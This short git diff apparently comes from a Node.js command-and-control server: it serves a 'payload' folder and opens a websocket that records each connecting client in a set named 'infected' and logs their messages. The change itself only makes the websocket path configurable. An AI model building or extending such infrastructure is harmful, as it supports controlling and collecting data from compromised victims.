@@ -9,12 +9,11 @@ express_ws(app)
 app.use(config.payloadpath, express.static(path.join(__dirname, '..', 'payload')))
 
 const infected = new Set()
-//app.ws(config.wspath + '/:id', (ws, wsreq) => {
-app.ws('/ws/:id', (ws, wsreq) => {
+app.ws(config.wspath + '/:id', (ws, wsreq) => {
     console.log(wsreq.params.id)
     infected.add(wsreq.params.id)
 
-    ws.on('message', (msg) => {
+    ws.on('message', msg => {
         // TODO write to a file
         console.log(JSON.stringify(msg))
     })
